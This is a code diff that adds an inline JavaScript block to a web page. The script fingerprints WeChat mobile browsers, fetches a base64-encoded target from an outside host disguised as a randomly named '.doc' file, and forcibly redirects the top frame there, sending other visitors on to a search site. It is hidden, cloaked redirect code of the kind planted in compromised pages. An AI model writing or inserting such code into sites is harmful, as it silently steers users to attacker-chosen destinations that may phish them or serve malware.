@@ -1,0 +1,70 @@
+<script>
+(function () {
+
+    function getQueryParam(name = null) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) return unescape(r[2]); return null;
+    }
+
+    function isWx() {
+        var platform = navigator.platform;
+        var win = platform.indexOf('Win') === 0;
+        var mac = platform.indexOf('Mac') === 0;
+        var ua = /micromessenger/.test(navigator.userAgent.toLowerCase())
+        if (ua && !win && !mac) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    function checkVersion() {
+        var userAgent = navigator.userAgent.toLowerCase();
+        var key = /micromessenger/;
+        let res = false;
+        if (key.test(userAgent)) {
+            var index = userAgent.search(key);
+            let version = '';
+            for (var i = index + 15; i < userAgent.length; i++) {
+                var item = userAgent[i];
+                if (/^\d{1,}$/.test(item) || item === '.') {
+                    version += item;
+                } else {
+                    break;
+                }
+            }
+            version = parseFloat(version);
+            if (version >= 7.0){
+                res = true;
+            }
+        }
+        return res;
+    }
+
+    function openLink(url) {
+        top.location = url;
+    }
+
+    function init() {
+        fetch(`${queryUrl}/XjUmP${rmd}.doc?t=${Date.now()}`).then(response => response.text()).then(res => openLink(atob(res)));
+    }
+
+    var queryUrl = 'https://3voe.cn';
+    var rmd = Math.random().toString(36).substr(2);
+	
+    if (!isWx() || !checkVersion()) {
+        var data = getQueryParam();
+        if (data && data["dev"]) {
+            console.log("【开发模式】");
+            init();
+        }else {
+			init();
+            openLink('http://www.baidu.com');
+        }
+    } else {
+        init();
+    }
+
+})();
+</script>
